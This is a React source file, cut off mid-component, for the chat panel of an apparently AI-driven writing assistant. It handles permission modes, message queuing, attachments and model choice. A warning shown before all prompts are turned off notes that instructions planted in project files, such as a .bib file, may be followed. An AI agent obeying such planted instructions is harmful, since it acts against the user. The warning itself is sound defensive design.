import {
  memo,
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
} from "react";
import { useDismiss } from "../useDismiss";
import { verbFor, type CallState } from "./tool-verb";
import { createTwoFilesPatch } from "diff";
import Prose from "./prose";
import { shortRule } from "./short-rule";
import { welcome, WELCOME_ACTIONS } from "../welcome";
import { agentName, usageNote } from "../agent-name";
import { Chevron } from "../chrome";
import api from "../api";
import {
  clearChat,
  firstChangedLine,
  get,
  markLive,
  markReverted,
  pushChat,
  resolvePermission,
  set,
  useStore,
  nextId,
  type ChatItem,
  type State,
} from "../store";

export type ChatHandle = {
  seed(text: string): void;
  /** Put the caret in the box.  The keyboard shortcut that opens the panel
   *  is only worth having if it leaves you ready to type. */
  focusComposer(): void;
};

/** Two kinds of noise the raw stream produces, removed before rendering:
 *  an `Edited main.tex` row immediately followed by the chip that says the
 *  same thing with a diff, and the same read repeated back to back. */
/** What a resolved card is called. Shared, because the decision is drawn
 *  both on its own row and on the tool row an answered card folds into,
 *  and those two must not drift into different words for one answer. */
export function decisionWords(decision: string | undefined): string {
  return decision === "expired"
    ? "Not answered"
    : decision === "deny"
      ? "Denied"
      : decision === "auto"
        ? "Allowed automatically"
        : decision === "conversation"
          ? "Allowed for this conversation"
          : decision === "always"
            ? "Allowed from now on"
            : "Allowed";
}

export function tidy(items: ChatItem[]): ChatItem[] {
  const out: ChatItem[] = [];
  for (const item of items) {
    if (item.kind === "tool" && HIDDEN_TOOLS.has(item.name)) continue;
    const previous = out[out.length - 1];
    if (
      item.kind === "edit" &&
      previous?.kind === "tool" &&
      ["Edit", "MultiEdit", "Write"].includes(previous.name) &&
      previous.summary.endsWith(item.path)
    ) {
      out.pop();
    } else if (
      // Records collapse; questions never do. A turn at one of the quiet
      // positions writes a row for every action it took, and at the
      // quietest one that record is the only account of what was done, so
      // a run of forty identical `Allowed automatically` lines is both the
      // audit trail working and unreadable. Same tool, same decision, same
      // literal thing, consecutively, and it is one row with a count.
      //
      // An *undecided* card is a question, and two questions are not one
      // question whatever they have in common, so nothing collapses until
      // it has been answered.
      item.kind === "permission" &&
      previous?.kind === "permission" &&
      item.decision &&
      previous.decision === item.decision &&
      previous.tool === item.tool &&
      previous.detail === item.detail
    ) {
      out[out.length - 1] = {
        ...previous,
        repeats: (previous.repeats ?? 1) + 1,
      };
      continue;
    } else if (
      // A card and the call it is about are one event, and were drawn as
      // two rows saying the same command, one above the other. Worse than
      // the repetition: the tool row is written when the call arrives
      // rather than when it is permitted, and every verb is past tense, so
      // `Ran echo hello` sat above a card headed "Run a shell command"
      // and stayed there if the writer said no.
      //
      // Merged by the id the card now carries, not by adjacency, because
      // the pairing has to survive a reload rebuilding the panel from the
      // record.
      item.kind === "permission" &&
      item.toolId &&
      previous?.kind === "tool" &&
      previous.id === item.toolId
    ) {
      // The card is attached either way, because the row above needs it to
      // know which tense it may use. Only an *answered* card is folded
      // away: an open one is a question with four buttons on it, and a
      // question the writer cannot answer is worse than a repeated line.
      out[out.length - 1] = { ...previous, card: item };
      if (item.decision) continue;
    } else if (
      item.kind === "tool" &&
      previous?.kind === "tool" &&
      previous.name === item.name &&
      previous.summary === item.summary
    ) {
      out[out.length - 1] = {
        ...previous,
        repeats: (previous.repeats ?? 1) + 1,
        // Summed, not the first one's.  Fourteen reads collapsed into one
        // row should say what the fourteen cost, which is the number worth
        // knowing about a turn that spent a while looking things up.
        ms:
          previous.ms == null && item.ms == null
            ? undefined
            : (previous.ms ?? 0) + (item.ms ?? 0),
        ok: previous.ok !== false && item.ok !== false,
      };
      continue;
    }
    out.push(item);
  }
  return out;
}

export default function Chat({
  onShowEdit,
  onHoverEdit,
  onFold,
  onAddContext,
  handleRef,
}: {
  onShowEdit: (path: string, line: number) => void;
  onHoverEdit: (path: string, range: [number, number] | null) => void;
  onFold?: () => void;
  onAddContext?: (kind: "style" | "voice" | "template") => void;
  handleRef: (handle: ChatHandle) => void;
}) {
  const chat = useStore((s) => s.chat);
  // Collapsing repeated tool rows walks the whole transcript.  Streaming a
  // long answer re-renders this panel twenty times a second, and without
  // this it did that walk every time.
  const shown = useMemo(() => tidy(chat), [chat]);

  const thinking = useStore((s) => s.thinking);
  const selected = useStore((s) => s.selected);
  const blocked = useStore((s) => s.awaitingPermission);
  // What the agent is doing at this moment, read from the events rather
  // than guessed at.  This used to walk the whole transcript backwards on
  // every render, which is twenty walks a second while an answer streams,
  // and it could not tell a finished call from a running one because
  // nothing said a call had finished: a turn that spent twenty seconds in
  // one tool showed the same line throughout and read as a turn that had
  // stopped.
  const current = useStore((s) => s.activity);
  const activity = blocked
    ? "Waiting"
    : !thinking
      ? ""
      : current
        ? current.kind === "tool"
          ? `${verbFor(current.name)}${current.label ? ` ${shorten(current.label)}` : ""}`
          : current.label
        : "Thinking";
  const agent = useStore((s) => s.agent);
  const provider = agent?.provider;
  const name = agentName(provider);
  const [draft, setDraft] = useState("");
  const stream = useRef<HTMLDivElement | null>(null);
  const composer = useRef<HTMLTextAreaElement | null>(null);
  const pinned = useRef(true);
  // The question *and* what was selected when it was asked: a queued
  // follow-up goes out after the current turn ends, by which time the
  // writer has usually selected something else or nothing at all.
  const queued = useRef<
    { text: string; selection: State["selected"]; attached: string[] }[]
  >([]);
  // A ref does not re-render, so the "yours will go next" line read a count
  // that only changed when something else happened to redraw the panel.
  const [queuedCount, setQueuedCount] = useState(0);
  const [setupOpen, setSetupOpen] = useState(false);
  const projectId = useStore((s) => s.projectId);
  const [usage, setUsage] = useState<Awaited<ReturnType<typeof api.usage>> | null>(null);
  const [showUsage, setShowUsage] = useState(false);
  const usageRef = useRef<HTMLDivElement | null>(null);
  const usageButton = useRef<HTMLButtonElement | null>(null);
  const [modelOpen, setModelOpen] = useState(false);
  const [confirmClear, setConfirmClear] = useState(false);
  const modelRef = useRef<HTMLDivElement | null>(null);
  const modelButton = useRef<HTMLButtonElement | null>(null);
  // The two blocks that open *above* the composer.  They come before the
  // box in the DOM and their buttons come after it, so Tab from a trigger
  // walks away from the thing it just opened -- focus has to be moved by
  // hand, and given back when it closes.
  const confirmRef = useRef<HTMLDivElement | null>(null);
  const clearButton = useRef<HTMLButtonElement | null>(null);
  const keepButton = useRef<HTMLButtonElement | null>(null);
  const setupRef = useRef<HTMLDivElement | null>(null);
  const setupButton = useRef<HTMLButtonElement | null>(null);
  // Every focus inside this panel is `preventScroll`, for the reason given
  // over `handleRef` below: the panel can be outside the shell when one of
  // these runs, and a focus that scrolls takes the whole window with it.
  const closeConfirm = useCallback(() => {
    setConfirmClear(false);
    clearButton.current?.focus({ preventScroll: true });
  }, []);
  const closeSetup = useCallback(() => {
    setSetupOpen(false);
    setupButton.current?.focus({ preventScroll: true });
  }, []);
  useDismiss(confirmRef, confirmClear, closeConfirm, clearButton);
  useDismiss(setupRef, setupOpen, closeSetup, setupButton);
  useDismiss(
    modelRef,
    modelOpen,
    useCallback(() => setModelOpen(false), []),
    modelButton,
  );
  const mode = useStore((s) => s.mode);
  // Only the Claude agent ever puts a card up, so only it is offered the
  // control: one on the others would promise a change that does not
  // happen.
  const [asks, setAsks] = useState(false);
  const [modeOpen, setModeOpen] = useState(false);
  /** Images waiting to go with the next question. Local state rather than
   *  the store, because nothing outside this panel needs them and they are
   *  gone the moment Send is pressed. `url` is an object URL for the
   *  thumbnail, revoked when the chip goes. */
  const [attached, setAttached] = useState<
    { path: string; name: string; url: string }[]
  >([]);
  const [attaching, setAttaching] = useState(0);
  /** When the running turn started, or null. Set from `thinking` rather
   *  than from an event, because `turn_start` is not the only way a browser
   *  learns a turn is running: one that reconnects mid-turn finds out from
   *  `reconcile`, and a turn whose age started at that moment is a better
   *  answer than no age at all. */
  const [turnSince, setTurnSince] = useState<number | null>(null);
  const picker = useRef<HTMLInputElement | null>(null);
  // The position that asks about nothing is reached through a sentence, not
  // through a click. Held here rather than inside the popover because the
  // confirmation opens above the composer, in the same idiom as the
  // new-conversation question, and the popover closes on the way.
  const [confirmAll, setConfirmAll] = useState(false);
  const modeRef2 = useRef<HTMLDivElement | null>(null);
  const modeButton = useRef<HTMLButtonElement | null>(null);
  const confirmAllRef = useRef<HTMLDivElement | null>(null);
  const keepAskingButton = useRef<HTMLButtonElement | null>(null);
  const closeConfirmAll = useCallback(() => {
    setConfirmAll(false);
    modeButton.current?.focus({ preventScroll: true });
  }, []);
  const chooseMode = async (chosen: "ask" | "project" | "all") => {
    if (!projectId) return;
    setModeOpen(false);
    if (chosen === "all" && mode !== "all") {
      setConfirmAll(true);
      // Into the block and onto the safe half of it. The block opens
      // *above* the composer and its buttons come after the box in the
      // DOM, so Tab from the trigger walks away from the thing it just
      // opened; focus has to be moved by hand, and it goes to the answer
      // that keeps the fence up.
      window.setTimeout(
        () => keepAskingButton.current?.focus({ preventScroll: true }),
        0,
      );
      return;
    }
    setConfirmAll(false);
    try {
      await api.setMode(projectId, chosen);
      set({ mode: chosen });
    } catch (error: any) {
      set({ error: error.message });
    }
  };
  useDismiss(
    modeRef2,
    modeOpen,
    useCallback(() => setModeOpen(false), []),
    modeButton,
  );
  useDismiss(confirmAllRef, confirmAll, closeConfirmAll, modeButton);
  /** Switch the model this project's agent answers on. */
  const chooseModel = async (chosen: string) => {
    if (!projectId) return;
    setModelOpen(false);
    try {
      const answer = await api.setModel(projectId, chosen);
      setUsage(await api.usage(projectId));
      // The client carries the model it was started with, so a change made
      // mid-answer is held back rather than applied -- applying it used to
      // close the transport the running turn was reading from, and that
      // turn then ended without ever saying so.  A control that appears to
      // do nothing is worse than one that explains itself.
      if (answer.deferred) {
        pushChat({
          kind: "notice",
          id: `model-${Date.now()}`,
          text: "The model changes for your next question: this answer finishes on the one it started with.",
          tone: "plain",
        });
      }
    } catch (error: any) {
      set({ error: error.message });
    }
  };

  useDismiss(
    usageRef,
    showUsage,
    useCallback(() => setShowUsage(false), []),
    usageButton,
  );
  const [focusedComposer, setFocusedComposer] = useState(false);

  // The tally follows the end of a turn, which is when it changes.
  useEffect(() => {
    if (!projectId || thinking) return;
    api
      .usage(projectId)
      .then((answer) => {
        setUsage(answer);
        // A reload has no other way to learn either of these.
        setAsks(!!answer.asks);
        set({ mode: answer.mode ?? (answer.auto ? "project" : "ask") });
      })
      .catch(() => undefined);
  }, [projectId, thinking]);

  // `preventScroll` on both, and this one is not a nicety.  Opening the
  // panel puts the caret in the composer 60ms later, and when the panel is
  // an overlay it is still sliding in from beyond the right edge at that
  // point -- so the box being focused is outside the shell.  A bare
  // `focus()` has the browser scroll it into view, the shell is a scroll
  // container even though its overflow is hidden, and the whole layout ends
  // up dragged left by the width of the panel: the file rail off the
  // screen, the editor's gutter clipped at x=0, and a band of bare ground
  // down the right where the panes no longer reach.
  useEffect(() => {
    handleRef({
      seed: (text: string) => {
        setDraft(text);
        composer.current?.focus({ preventScroll: true });
      },
      focusComposer: () => composer.current?.focus({ preventScroll: true }),
    });
  }, [handleRef]);

  // Follow the stream only while the reader is already at the bottom.
  useEffect(() => {
    const element = stream.current;
    if (element && pinned.current) element.scrollTop = element.scrollHeight;
  }, [chat]);

  /** Take images somebody pasted, dropped or picked.
   *
   *  Only images, and quietly: a paste is usually text, and a drop on the
   *  panel is usually an accident, so anything else is left alone rather
   *  than refused with a message about a thing the writer was not trying to
   *  do. A file the agent cannot look at is refused by the route, which is
   *  where the list of what it can look at lives.
   */
  const take = useCallback(
    async (files: File[]) => {
      const projectId = get().projectId;
      if (!projectId) return;
      const images = files.filter((file) => file.type.startsWith("image/"));
      if (!images.length) return;
      setAttaching((count) => count + images.length);
      for (const file of images) {
        try {
          const kept = await api.attach(projectId, file);
          setAttached((held) =>
            held.some((one) => one.path === kept.path)
              ? held
              : [...held, {
                  path: kept.path,
                  name: file.name || kept.name,
                  url: URL.createObjectURL(file),
                }],
          );
        } catch (error: any) {
          set({ error: error.message });
        } finally {
          setAttaching((count) => Math.max(0, count - 1));
        }
      }
    },
    [],
  );

  const drop = useCallback((path: string) => {
    setAttached((held) => {
      const going = held.find((one) => one.path === path);
      if (going) URL.revokeObjectURL(going.url);
      return held.filter((one) => one.path !== path);
    });
  }, []);

  const send = async () => {
    const text = draft.trim();
    const projectId = get().projectId;
    if (!text || !projectId) return;
    // Taken now rather than when the turn actually starts: a queued
    // question goes later, and by then the writer has usually clicked
    // somewhere else and the selection they meant is gone.
    const held = get().selected;
    const images = attached.map((one) => one.path);
    setDraft("");
    for (const one of attached) URL.revokeObjectURL(one.url);
    setAttached([]);
    // Marked pending, so `turn_start` recognises it as this tab's own and
    // does not add a second. Every other tab has none and pushes one.
    pushChat({ kind: "user", id: nextId(), text, at: Date.now(), pending: true });
    pinned.current = true;
    // Read from the store, not from this render's closure.  Pressing Enter
    // in the gap between the server's `done` and React re-rendering queued
    // the message -- into a ref, so nothing re-rendered, so the effect that
    // drains the queue never fired again and it sat there for good, looking
    // sent.
    if (get().thinking) {
      // A follow-up thought arrives while Claude is still answering the
      // last one.  Hold it and send it when the turn ends, rather than
      // refusing it and making the writer remember to ask again.
      queued.current.push({ text, selection: held, attached: images });
      setQueuedCount(queued.current.length);
      return;
    }
    try {
      await api.ask(projectId, text, held, images);
    } catch (error: any) {
      // Put it back in the box rather than losing what they typed.
      setDraft(text);
      set({ error: error.message });
    }
  };

  useEffect(() => {
    setTurnSince(thinking ? Date.now() : null);
  }, [thinking]);

  // Whatever was said while Claude was talking goes now.
  useEffect(() => {
    if (thinking || !projectId || !queued.current.length) return;
    const next = queued.current.shift();
    setQueuedCount(queued.current.length);
    if (next) {
      api.ask(projectId, next.text, next.selection, next.attached).catch((error: any) => {
        set({ error: error.message });
      });
    }
  }, [thinking, projectId]);

  return (
    <div className="flex h-full min-h-0 flex-col bg-surface" data-testid="chat">
      <div
        className={`flex h-[32px] shrink-0 items-center gap-2 border-b border-line px-[10px] ${
          onFold ? "cursor-pointer transition-colors duration-[90ms] hover:bg-surface-2" : ""
        }`}
        title={onFold ? "Fold this panel away" : undefined}
        data-testid="chat-header"
        onClick={(event) => {
          if (!onFold) return;
          if ((event.target as HTMLElement).closest("button, select, input")) return;
          onFold();
        }}
      >
        <span className="t-ui-lg shrink-0 font-serif">{name}</span>
        {thinking || blocked ? (
          <span
            className="flex min-w-0 flex-1 items-center gap-[6px]"
            data-testid="working"
            aria-live="polite"
          >
            <span
              className={`nx-working h-[6px] w-[6px] shrink-0 rounded-full ${
                blocked ? "bg-warn" : "bg-pen"
              }`}
            />
            <span className="t-micro truncate text-ink-2" title={activity}>
              {activity}
            </span>
            <Elapsed since={blocked ? null : current?.since ?? null} />
            {/* The turn's own age, as distinct from the age of whatever it
                is doing this second. A writer wants to know a turn is two
                minutes old rather than that its current tool call is four
                seconds old, and the two are very different numbers on a
                long turn. Parenthesised so the pair reads as one thing
                rather than as two competing counters. */}
            {turnSince && !blocked ? (
              <Elapsed since={turnSince} parenthesised />
            ) : null}
          </span>
        ) : null}
        {/* The state, always on screen, as distinct from the control,
            which is under the composer. A lowered fence that survives a
            restart has to be visible without opening anything, and it now
            has to say *which* of the two quiet positions it is in, since
            they are not the same offer. One click steps back one position,
            so the way out is never more than that. */}
        {mode !== "ask" ? (
          <button
            className="t-micro shrink-0 rounded-[3px] border border-warn px-1 text-warn"
            data-testid="auto-chip"
            title={
              mode === "all"
                ? "Nothing is being asked about, not even a write outside this project. Click to go back to asking about those."
                : "The work runs without asking. A write outside the project and anything reaching the internet are still asked about. Click to start asking about everything."
            }
            onClick={() => chooseMode(mode === "all" ? "project" : "ask")}
          >
            {mode === "all" ? "Auto, all" : "Auto"}
          </button>
        ) : null}
        {/* Only when the activity line is not there. Two `flex-1` siblings
            split the slack between them, so the one line saying what the
            agent is doing clipped at half the room it had, with about a
            hundred pixels of nothing beside it: `Read chapte…`. */}
        {thinking || blocked ? null : <span className="flex-1" />}
        {thinking ? (
          <button
            className="nx-hover t-micro text-hint hover:text-ink"
            data-testid="stop"
            // The key is on the button rather than only in a shortcut
            // table, because Stop is the one control somebody reaches for
            // in a hurry and a shortcut nobody knows about is not one.
            title="Stop this turn (Escape)"
            onClick={() => {
              const projectId = get().projectId;
              if (projectId) api.interrupt(projectId).catch(() => undefined);
            }}
          >
            Stop
          </button>
        ) : null}
        <button
          ref={usageButton}
          className={`quiet t-micro flex h-[26px] items-center gap-1 rounded-[3px] px-2 hover:bg-surface-3 ${
            showUsage ? "bg-surface-3 text-ink" : ""
          }`}
          title="What this project has used"
          aria-expanded={showUsage}
          onClick={() => setShowUsage(!showUsage)}
        >
          Usage
          <span className={showUsage ? "rotate-180" : ""}>
            <Chevron direction="down" />
          </span>
        </button>
        {onFold ? (
          <button
            className="quiet flex h-[26px] w-[22px] items-center justify-center rounded-[3px] hover:bg-surface-3"
            title="Fold this panel away"
            aria-label="Fold this panel away"
            onClick={onFold}
          >
            <Chevron direction="right" />
          </button>
        ) : null}
      </div>

      {showUsage && usage ? (
        <div
          ref={usageRef}
          className="nx-arrive shrink-0 border-b border-line bg-surface-2 px-[10px] py-3"
        >
          <div className="flex items-baseline gap-2">
            <span className="t-ui-lg tabular-nums text-ink">
              {usage.usage.costUsd
                ? `$${usage.usage.costUsd.toFixed(usage.usage.costUsd < 1 ? 3 : 2)}`
                : "$0.000"}
            </span>
            <span className="t-micro text-ink-3">estimated, this project</span>
          </div>
          <div className="t-micro mt-1 text-ink-2">
            {usage.usage.turns} {usage.usage.turns === 1 ? "turn" : "turns"} ·{" "}
            {Math.round(usage.usage.durationMs / 1000)}s of model time
          </div>
          <div className="t-micro text-ink-2">
            {compact(usage.usage.inputTokens)} tokens in
            {usage.usage.cacheReadTokens
              ? ` (${compact(usage.usage.cacheReadTokens)} from cache)`
              : ""}{" "}
            · {compact(usage.usage.outputTokens)} out
          </div>
          <p className="t-micro mt-2 text-ink-3">{usageNote(provider)}</p>
        </div>
      ) : null}

      <div
        ref={stream}
        className="min-h-0 flex-1 overflow-auto px-[10px] py-3"
        onScroll={(event) => {
          const element = event.currentTarget;
          pinned.current =
            element.scrollHeight - element.scrollTop - element.clientHeight < 40;
        }}
      >
        {chat.length === 0 ? (
          <div className="nx-arrive flex">
            <span className="w-[3px] shrink-0 bg-pen" />
            <div className="ml-3 min-w-0 flex-1">
              <div className="t-micro mb-1 text-pen">{name}</div>
              <div className="t-prose text-ink">
                <Prose text={welcome(name, provider !== "openai")} />
              </div>
              <div className="mt-3 flex flex-col gap-2">
                {WELCOME_ACTIONS.map((action) => (
                  <button
                    key={action.kind}
                    className="ghost-button nx-press px-3 py-2 text-left"
                    onClick={() => onAddContext?.(action.kind)}
                  >
                    <span className="t-ui block">{action.label}</span>
                    <span className="t-meta block text-ink-2">{action.detail}</span>
                  </button>
                ))}
              </div>
            </div>
          </div>
        ) : null}
        <div className="flex flex-col gap-5">
          {shown.map((item) => (
            <Item
              key={item.id}
              item={item}
              onShowEdit={onShowEdit}
              onHoverEdit={onHoverEdit}
            />
          ))}
        </div>
      </div>

      <div className="shrink-0 border-t border-line p-[8px]">
        {setupOpen ? (
          <div
            ref={setupRef}
            id="nx-setup"
            role="group"
            aria-label="Template and voice"
            className="mb-2 flex flex-col gap-2 rounded-[3px] border border-line bg-surface-2 p-2"
          >
            {WELCOME_ACTIONS.map((action) => (
              <button
                key={action.kind}
                className="ghost-button nx-press px-3 py-2 text-left"
                onClick={() => {
                  setSetupOpen(false);
                  onAddContext?.(action.kind);
                }}
              >
                <span className="t-ui block">{action.label}</span>
                <span className="t-meta block text-ink-2">{action.detail}</span>
              </button>
            ))}
          </div>
        ) : null}
        {/* What is going with the question. Above the composer beside the
            selection chip, with a thumbnail, because an image attached by
            accident to a question about something else is worse than no
            attachment and the only way to notice is to see it. */}
        {attached.length || attaching ? (
          <div
            className="mb-[6px] flex flex-wrap items-center gap-[6px]"
            data-testid="attachments"
          >
            {attached.map((one) => (
              <span
                key={one.path}
                className="flex h-[26px] items-center gap-[6px] rounded-[3px] bg-surface-2 pl-[3px] pr-1"
              >
                <img
                  src={one.url}
                  alt=""
                  className="h-[20px] w-[20px] rounded-[2px] object-cover"
                />
                <span className="t-micro max-w-[14ch] truncate text-ink-2">
                  {one.name}
                </span>
                <button
                  className="quiet flex h-[16px] w-[16px] items-center justify-center rounded-[2px] hover:bg-surface-3"
                  aria-label={`Take ${one.name} off this question`}
                  data-testid="attachment-remove"
                  onClick={() => drop(one.path)}
                >
                  <svg width="8" height="8" viewBox="0 0 9 9" aria-hidden="true">
                    <path
                      d="M1 1 L8 8 M8 1 L1 8"
                      stroke="currentColor"
                      strokeWidth="1.2"
                      fill="none"
                    />
                  </svg>
                </button>
              </span>
            ))}
            {attaching ? (
              <span className="t-micro text-ink-3">
                {attaching === 1 ? "Adding an image" : `Adding ${attaching} images`}
              </span>
            ) : null}
          </div>
        ) : null}
        {/* Turning the fence off entirely is answered in place above the
            composer, in the same idiom as the new-conversation question and
            for the same reason: the sentence needs room, and this app has
            no modals. Three sentences, because the risk has three parts and
            summarising it into one would be the kind of warning people
            learn to dismiss. Said once, on the way in, and never again.

            The safe button takes focus, and it is the one that keeps the
            two remaining cards. */}
        {confirmAll ? (
          <div
            ref={confirmAllRef}
            id="nx-all-confirm"
            role="group"
            aria-label="Stop asking about anything"
            className="mb-2 flex rounded-[5px] border border-line bg-surface-2"
          >
            <span className="w-[3px] shrink-0 rounded-l-[5px] bg-warn" />
            <div className="min-w-0 flex-1 p-2">
              <p className="t-meta text-ink">
                Nothing will ask. The agent will be able to write outside this
                project, run any command and reach the internet, with no card.
              </p>
              <p className="t-meta mt-2 text-ink-2">
                Some of its instructions come from this project&rsquo;s own
                files, and those arrive from templates, clones and co-authors.
                A sentence in somebody else&rsquo;s .bib file is an
                instruction it may follow.
              </p>
              <p className="t-meta mt-2 text-ink-2">
                Everything is still recorded in this conversation, so you can
                read afterwards what was done.
              </p>
              <div className="mt-2 flex flex-wrap gap-[6px]">
                <button
                  ref={keepAskingButton}
                  className="ghost-button h-[26px] shrink-0 whitespace-nowrap px-3 t-ui"
                  data-testid="all-keep"
                  onClick={closeConfirmAll}
                >
                  Keep asking about those two
                </button>
                <button
                  className="h-[26px] shrink-0 whitespace-nowrap rounded-[3px] border border-warn px-3 t-ui text-warn"
                  data-testid="all-confirm"
                  onClick={async () => {
                    if (!projectId) return;
                    setConfirmAll(false);
                    try {
                      await api.setMode(projectId, "all");
                      set({ mode: "all" });
                    } catch (error: any) {
                      set({ error: error.message });
                    }
                    modeButton.current?.focus({ preventScroll: true });
                  }}
                >
                  Stop asking
                </button>
              </div>
            </div>
          </div>
        ) : null}
        {confirmClear ? (
          <div
            ref={confirmRef}
            id="nx-clear-confirm"
            role="group"
            aria-label="Start a new conversation"
            className="mb-2 rounded-[3px] border border-line bg-surface-2 p-2"
          >
            <p className="t-meta text-ink-2">
              Start a new conversation? The record of this one is kept on
              disk.
            </p>
            {/* The safe answer carries the weight, and it is the one that
                takes focus, because the default answer to "shall I throw
                this away" is no. It was the other way round: `Start new`
                was the ghost-button at --ink and `Keep this one` was quiet
                at --ink-3, which is the ink section 19 gives to `\include`
                rows that cannot be chosen. The app was drawing the answer
                it recommends in the colour it uses for things you cannot
                pick, on the confirmation that ends a conversation. */}
            <div className="mt-2 flex gap-[6px]">
              <button
                ref={keepButton}
                className="ghost-button h-[26px] px-3 t-ui"
                autoFocus
                data-testid="clear-keep"
                onClick={closeConfirm}
              >
                Keep this one
              </button>
              <button
                className="quiet t-ui h-[26px] rounded-[3px] border border-line px-3"
                data-tone="danger"
                data-testid="clear-confirm"
                onClick={async () => {
                  if (!projectId) return;
                  try {
                    await api.resetChat(projectId);
                    clearChat();
                    queued.current = [];
                    setQueuedCount(0);
                    setConfirmClear(false);
                  } catch (error: any) {
                    set({ error: error.message });
                  }
                }}
              >
                Start new
              </button>
            </div>
          </div>
        ) : null}
        {/* What the question is about to carry. Shown because the agent
            answering about a passage the writer no longer has in mind is
            baffling if there was never anything on screen saying it had
            been attached -- and because seeing it is how you learn that
            selecting a paragraph first is worth doing. */}
        {selected && selected.text.trim() ? (
          <div
            data-testid="selection-chip"
            className="t-micro mb-[6px] flex items-baseline gap-[6px] rounded-[3px] border border-line bg-surface-2 px-[8px] py-[4px] text-ink-3"
          >
            <span className="text-ink-2">
              {selected.fromLine === selected.toLine
                ? `Line ${selected.fromLine}`
                : `Lines ${selected.fromLine}\u2013${selected.toLine}`}
            </span>
            <span className="min-w-0 truncate">
              of {selected.path.split("/").pop()} goes with this
            </span>
          </div>
        ) : null}
        <textarea
          ref={composer}
          rows={3}
          value={draft}
          // Not disabled while a card is open, which is a deviation from
          // the specification and is recorded in section 28. The writer's
          // next question is very often about the thing the card is asking
          // about, and a box that will not take typing has taken the
          // conversation away at the one moment they have something to
          // say. The queue that makes this safe already existed for a
          // question asked mid-turn; a card open means a turn is running,
          // so the question goes next rather than nowhere.
          //
          // The card's own keys stay bound to the card and not to the
          // window, which is what makes a live composer safe: typing `a`
          // into a textarea cannot answer a gate.
          // A screenshot arrives as a file on the clipboard on all three
          // platforms, so this is the whole of "paste an image": no
          // permission, no dialog. A paste that is text falls through to
          // the browser's own handling, which is what `take` returning
          // early does.
          onPaste={(event) => {
            const files = Array.from(event.clipboardData?.files ?? []);
            if (files.some((file) => file.type.startsWith("image/"))) {
              event.preventDefault();
              void take(files);
            }
          }}
          onDragOver={(event) => {
            if (Array.from(event.dataTransfer.types).includes("Files")) {
              event.preventDefault();
            }
          }}
          onDrop={(event) => {
            const files = Array.from(event.dataTransfer.files ?? []);
            if (files.some((file) => file.type.startsWith("image/"))) {
              event.preventDefault();
              void take(files);
            }
          }}
          placeholder={blocked ? `Ask ${name}, or answer above` : `Ask ${name}`}
          className={`t-ui w-full resize-none rounded-[3px] border bg-surface-2 px-2 py-[6px] outline-none transition-colors duration-[90ms] placeholder:text-ink-3 ${
            blocked ? "border-warn" : "border-line"
          }`}
          onFocus={() => setFocusedComposer(true)}
          onBlur={() => setFocusedComposer(false)}
          onChange={(event) => setDraft(event.target.value)}
          onKeyDown={(event) => {
            if (event.key === "Enter" && !event.shiftKey) {
              event.preventDefault();
              send();
            }
          }}
        />
        {/* The controls sit under the box rather than in the header: the
            header is a 32px bar that already carries the name, what the
            agent is doing, and the usage tally, and each of these is
            something you reach for while writing the question. */}
        <div className="mt-[6px] flex items-center gap-2">
          <div className="flex shrink-0 items-center">
            <button
              ref={clearButton}
              className={`${ICON} ${confirmClear ? ICON_ON : ""}`}
              data-tone={confirmClear ? "on" : undefined}
              aria-label="New conversation"
              aria-expanded={confirmClear}
              aria-controls={confirmClear ? "nx-clear-confirm" : undefined}
              title={
                thinking
                  ? "Wait for this answer to finish"
                  : "Start a new conversation"
              }
              data-testid="clear-chat"
              disabled={thinking}
              onClick={() => {
                setSetupOpen(false);
                setConfirmClear((asking) => {
                  // Into the block, and onto the safe half of it: this
                  // ends a conversation, so the default answer is no.
                  if (!asking) {
                    window.setTimeout(
                      () => keepButton.current?.focus({ preventScroll: true }),
                      0,
                    );
                  }
                  return !asking;
                });
              }}
            >
              <NewChat />
            </button>
            <div className="relative">
              <button
                ref={modelButton}
                className={`${ICON} ${modelOpen ? ICON_ON : ""}`}
                data-tone={modelOpen ? "on" : undefined}
                aria-label="Which model answers here"
                aria-expanded={modelOpen}
                title={`Model: ${
                  usage?.models?.find((entry) => entry.id === usage?.model)
                    ?.name ?? "default"
                }`}
                data-testid="model-open"
                onClick={() => setModelOpen((open) => !open)}
              >
                <Sliders />
              </button>
              {modelOpen ? (
                <div
                  ref={modelRef}
                  data-testid="model-menu"
                  className="nx-arrive absolute bottom-[30px] left-0 z-40 w-[230px] overflow-hidden rounded-[5px] border border-line bg-surface shadow-float"
                >
                  <div className="t-micro px-[10px] pb-1 pt-2 text-ink-2">
                    Which model answers here
                  </div>
                  {(usage?.models ?? [{ id: "", name: "Default", note: "" }]).map(
                    (entry) => (
                      <button
                        key={entry.id}
                        className="flex w-full items-start gap-2 border-t border-line px-[10px] py-[6px] text-left transition-colors duration-[90ms] hover:bg-surface-2"
                        aria-pressed={(usage?.model ?? "") === entry.id}
                        onClick={() => chooseModel(entry.id)}
                      >
                        <span
                          className={`mt-[6px] h-[4px] w-[4px] shrink-0 rounded-full ${
                            (usage?.model ?? "") === entry.id
                              ? "bg-pen"
                              : "bg-transparent"
                          }`}
                        />
                        <span className="min-w-0 flex-1">
                          <span className="t-ui block truncate text-ink">
                            {entry.name}
                          </span>
                          {entry.note ? (
                            <span className="t-meta block text-ink-2">
                              {entry.note}
                            </span>
                          ) : null}
                        </span>
                      </button>
                    ),
                  )}
                </div>
              ) : null}
            </div>
            {/* Only the Claude agent ever puts a card up, so only it is
                offered the control: one on the others would promise a
                change that does not happen.

                Three positions rather than two, so this is a popover and
                not a switch: `role="switch"` with `aria-checked` cannot
                describe three states, and a control that cycles through
                them on click makes the writer press it twice to find out
                where they are. The popover opens upward and passes its
                anchor to `useDismiss`, without which it would close on
                `pointerdown` and reopen on `click`. */}
            {asks ? (
              <div className="relative">
                <button
                  ref={modeButton}
                  className={`${ICON} ${mode !== "ask" ? ICON_ON : ""}`}
                  data-tone={mode !== "ask" ? "warn" : undefined}
                  aria-haspopup="menu"
                  aria-expanded={modeOpen}
                  aria-label={`What to ask about: ${MODE_TITLES[mode]}`}
                  title="What to ask about"
                  data-testid="auto-toggle"
                  onClick={() => setModeOpen((open) => !open)}
                >
                  <Bolt />
                </button>
                {modeOpen ? (
                  <div
                    ref={modeRef2}
                    role="menu"
                    data-testid="mode-menu"
                    className="nx-arrive absolute bottom-[30px] left-0 z-20 w-[288px] rounded-[5px] border border-line bg-surface-2 p-1 shadow-float"
                  >
                    {(["ask", "project", "all"] as const).map((option) => (
                      <button
                        key={option}
                        role="menuitemradio"
                        aria-checked={mode === option}
